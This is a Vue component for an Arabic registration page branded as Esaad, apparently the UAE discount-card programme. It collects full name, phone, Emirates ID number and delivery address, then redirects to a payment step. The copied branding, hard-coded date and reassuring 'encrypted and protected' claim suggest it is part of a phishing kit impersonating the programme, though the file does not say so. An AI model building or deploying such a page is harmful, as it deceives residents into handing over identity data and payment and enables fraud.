<script setup lang="ts">
import { ref } from 'vue';
import { ChevronDown, Calendar, ArrowRight, ShieldCheck } from 'lucide-vue-next';
import { useRouter } from 'vue-router';
import { createCardRequest } from '../api';

const router = useRouter();

const formData = ref({
  name: '',
  mobile: '',
  idNumber: '',
  cardType: '',
  address: '',
  date: '29/05/2026'
});

const isSubmitting = ref(false);

const errors = ref({
  name: '',
  mobile: '',
  idNumber: '',
  cardType: '',
  address: ''
});

const validateForm = () => {
  let isValid = true;
  errors.value = { name: '', mobile: '', idNumber: '', cardType: '', address: '' };

  if (!formData.value.name.trim()) {
    errors.value.name = 'الاسم مطلوب';
    isValid = false;
  }
  
  if (!formData.value.mobile.trim() || !/^[0-9\+\-\s]{9,15}$/.test(formData.value.mobile)) {
    errors.value.mobile = 'رقم الهاتف غير صالح';
    isValid = false;
  }

  if (!formData.value.idNumber.trim()) {
    errors.value.idNumber = 'رقم الهوية مطلوب';
    isValid = false;
  }

  if (!formData.value.cardType) {
    errors.value.cardType = 'يرجى اختيار نوع البطاقة';
    isValid = false;
  }

  if (!formData.value.address.trim()) {
    errors.value.address = 'عنوان التوصيل مطلوب';
    isValid = false;
  }

  return isValid;
};

const submitForm = async () => {
  if (isSubmitting.value) return;
  if (!validateForm()) return;
  
  isSubmitting.value = true;
  try {
    await createCardRequest({
      ...formData.value
    });
    router.push('/payment');
  } catch (error) {
    console.error('Error creating card request:', error);
  } finally {
    isSubmitting.value = false;
  }
};

const goBack = () => {
  router.push('/');
};
</script>

<template>
  <div dir="rtl" class="max-w-xl mx-auto bg-white min-h-screen flex flex-col font-sans text-gray-900 relative overflow-x-hidden">
    
    <!-- Esaad Top Dark Header + 3D Stage Card Banner -->
    <div class="relative w-full bg-[#040c06] overflow-hidden pb-6">
      <div class="absolute inset-0 bg-[radial-gradient(circle_at_50%_30%,_rgba(32,120,56,0.38)_0%,_rgba(6,24,11,0.9)_65%,_#020603_100%)] pointer-events-none"></div>

      <!-- Top Bar -->
      <header class="relative z-20 flex items-center justify-between px-4 pt-3 pb-2.5 border-b border-white/10">
        <button
          @click="goBack"
          aria-label="العودة"
          class="w-8 h-8 rounded-full bg-white/10 hover:bg-white/20 flex items-center justify-center text-white transition-colors cursor-pointer"
        >
          <ArrowRight class="w-4 h-4" />
        </button>

        <!-- Esaad Logo -->
        <div @click="goBack" class="cursor-pointer flex flex-col items-center select-none">
          <div class="text-[#39b54a] font-black text-base leading-none tracking-tight">إسعاد</div>
          <div class="text-[#39b54a] font-extrabold text-sm leading-none -mt-0.5 tracking-tight">esaad</div>
          <svg class="w-10 h-3 -mt-0.5" viewBox="0 0 60 18" fill="none">
            <circle cx="14" cy="4" r="2" fill="#39b54a" />
            <circle cx="46" cy="4" r="2" fill="#39b54a" />
            <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" fill="none" />
          </svg>
        </div>

        <div class="w-8"></div>
      </header>

      <!-- Hero Card Visual Showcase -->
      <div class="relative z-10 pt-5 px-5 flex flex-col items-center text-center">
        <div
          class="w-[200px] h-[124px] rounded-xl shadow-2xl transform -rotate-6 overflow-hidden border border-[#39b54a]/40 relative mb-4"
          style="background: linear-gradient(135deg, #009944 0%, #007b36 55%, #005e28 100%);"
          dir="ltr"
        >
          <svg class="absolute inset-0 w-full h-full opacity-20" viewBox="0 0 200 130" fill="none">
            <path d="M-20 110 Q 60 50 220 90" stroke="#7ce895" stroke-width="1" />
            <path d="M-20 120 Q 70 60 220 100" stroke="#7ce895" stroke-width="1" />
          </svg>
          <!-- Gold Chip -->
          <div class="absolute right-4 top-9 w-7 h-5 rounded-xs bg-gradient-to-br from-[#f6d365] to-[#cda349] border border-yellow-600/50"></div>
          <!-- Center Logo -->
          <div class="absolute inset-0 flex flex-col items-center justify-center">
            <span class="text-[#a3e6b5] font-black text-lg leading-none">إسعاد</span>
            <span class="text-[#a3e6b5] font-extrabold text-base leading-none -mt-0.5">esaad</span>
            <svg class="w-10 h-3 -mt-0.5" viewBox="0 0 60 18" fill="none">
              <circle cx="14" cy="4" r="2" fill="#a3e6b5" />
              <circle cx="46" cy="4" r="2" fill="#a3e6b5" />
              <path d="M 6 6 Q 30 18 54 6" stroke="#a3e6b5" stroke-width="3" stroke-linecap="round" />
            </svg>
          </div>
          <div class="absolute bottom-2 left-3 text-left leading-tight">
            <div class="text-[7.5px] font-bold tracking-wider text-[#b6f0c6] uppercase">{{ formData.name || 'ESAAD CARD HOLDER NAME' }}</div>
            <div class="text-[6.5px] font-mono text-[#9be2b0] tracking-wider">{{ formData.idNumber || '784-1234-1234567-1' }}</div>
          </div>
        </div>

        <h1 class="text-white font-extrabold text-base leading-snug">
          التسجيل وطلب بطاقة إسعاد
        </h1>
        <p class="text-gray-300 text-[11px] mt-1 max-w-xs leading-relaxed">
          أدخل البيانات المطلوبة لإكمال طلب البطاقة وتأكيد عنوان التوصيل
        </p>
      </div>
    </div>

    <!-- Form Section -->
    <div class="px-5 py-6 flex-1 bg-[#eef5f0]">
      <form @submit.prevent="submitForm" class="bg-white border border-gray-200/80 rounded-2xl p-5 shadow-[0_4px_20px_rgba(0,0,0,0.05)] max-w-md mx-auto">
        
        <div class="space-y-5 text-right">
          
          <!-- Name -->
          <div class="relative">
            <label class="block text-[11px] font-bold text-[#008a40] mb-1">الاسم الكامل</label>
            <input 
              v-model="formData.name"
              type="text" 
              dir="rtl"
              placeholder="الاسم كما يظهر في الهوية" 
              class="w-full border-b border-gray-300 rounded-none px-2 py-2 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-transparent transition-colors font-medium text-sm"
            />
            <p v-if="errors.name" class="text-red-600 text-[11px] mt-1">{{ errors.name }}</p>
          </div>

          <!-- Mobile number -->
          <div class="relative">
            <label class="block text-[11px] font-bold text-[#008a40] mb-1">رقم الهاتف المتحرك</label>
            <input 
              v-model="formData.mobile"
              type="tel" 
              dir="rtl"
              placeholder="05X XXX XXXX" 
              class="w-full border-b border-gray-300 rounded-none px-2 py-2 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-transparent transition-colors font-medium text-sm"
            />
            <p v-if="errors.mobile" class="text-red-600 text-[11px] mt-1">{{ errors.mobile }}</p>
          </div>

          <!-- ID Number -->
          <div class="relative">
            <label class="block text-[11px] font-bold text-[#008a40] mb-1">رقم الهوية الإماراتية</label>
            <input 
              v-model="formData.idNumber"
              type="text" 
              dir="rtl"
              placeholder="784-XXXX-XXXXXXX-X" 
              class="w-full border-b border-gray-300 rounded-none px-2 py-2 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-transparent transition-colors font-medium text-sm"
            />
            <p v-if="errors.idNumber" class="text-red-600 text-[11px] mt-1">{{ errors.idNumber }}</p>
          </div>

          <!-- Card Type Dropdown -->
          <div class="relative">
            <label class="block text-[11px] font-bold text-[#008a40] mb-1">فئة بطاقة إسعاد</label>
            <div class="relative">
              <select 
                v-model="formData.cardType"
                dir="rtl"
                class="w-full border-b border-gray-300 rounded-none px-2 py-2 appearance-none text-gray-900 focus:outline-none focus:border-[#009a44] bg-transparent transition-colors font-medium text-sm pl-8 cursor-pointer"
              >
                <option value="" disabled selected hidden>اختر نوع البطاقة</option>
                <option value="silver">بطاقة إسعاد الأساسية (Classic)</option>
                <option value="gold">بطاقة إسعاد الذهبية (Gold)</option>
                <option value="platinum">بطاقة إسعاد البلاتينية (Platinum)</option>
              </select>
              <div class="absolute inset-y-0 left-2 flex items-center pointer-events-none text-[#009a44]">
                <ChevronDown class="w-4 h-4" />
              </div>
            </div>
            <p v-if="errors.cardType" class="text-red-600 text-[11px] mt-1">{{ errors.cardType }}</p>
          </div>

          <!-- Address -->
          <div class="relative">
            <label class="block text-[11px] font-bold text-[#008a40] mb-1">عنوان التوصيل</label>
            <input 
              v-model="formData.address"
              type="text" 
              dir="rtl"
              placeholder="الإمارة، المنطقة، الشارع، رقم المبنى" 
              class="w-full border-b border-gray-300 rounded-none px-2 py-2 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-transparent transition-colors font-medium text-sm"
            />
            <p v-if="errors.address" class="text-red-600 text-[11px] mt-1">{{ errors.address }}</p>
          </div>

          <!-- Date -->
          <div class="relative">
            <label class="block text-[11px] font-bold text-[#008a40] mb-1">تاريخ الطلب</label>
            <div class="relative">
              <input 
                v-model="formData.date"
                type="text" 
                dir="rtl"
                readonly
                class="w-full border-b border-gray-300 rounded-none px-2 py-2 text-right focus:outline-none text-gray-700 bg-transparent font-medium text-sm pl-10 opacity-80 cursor-default"
              />
              <div class="absolute inset-y-0 left-2 flex items-center pointer-events-none text-[#009a44]">
                <Calendar class="w-4 h-4" />
              </div>
            </div>
          </div>

          <!-- Submit Button -->
          <div class="pt-3">
            <button 
              type="submit" 
              :disabled="isSubmitting"
              class="flex items-center justify-center gap-2 bg-[#008a40] hover:bg-[#007335] transition-colors text-white font-bold text-sm py-3 rounded-xl shadow-md w-full cursor-pointer disabled:opacity-70 disabled:cursor-not-allowed"
            >
              <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
              <span v-else>المتابعة</span>
            </button>
          </div>
          
        </div>

      </form>

      <!-- Trust note -->
      <div class="mt-5 flex items-center justify-center gap-2 text-[11px] text-gray-600">
        <ShieldCheck class="w-3.5 h-3.5 text-[#008a40]" />
        <span>جميع البيانات مشفرة ومحمية وفق معايير برنامج إسعاد</span>
      </div>
    </div>

    <!-- Esaad Footer -->
    <footer class="bg-[#e4f2ea] px-5 py-4 text-right border-t border-gray-200/60">
      <div class="flex items-center justify-between">
        <div class="flex flex-col items-center">
          <span class="text-[#008a40] font-black text-xs leading-none">إسعاد</span>
          <span class="text-gray-900 font-extrabold text-[10px] leading-none">esaad</span>
        </div>
        <span class="text-[11px] text-gray-600 font-medium">© 2026 esaad, كل الحقوق محفوظة.</span>
      </div>
    </footer>

  </div>
</template>
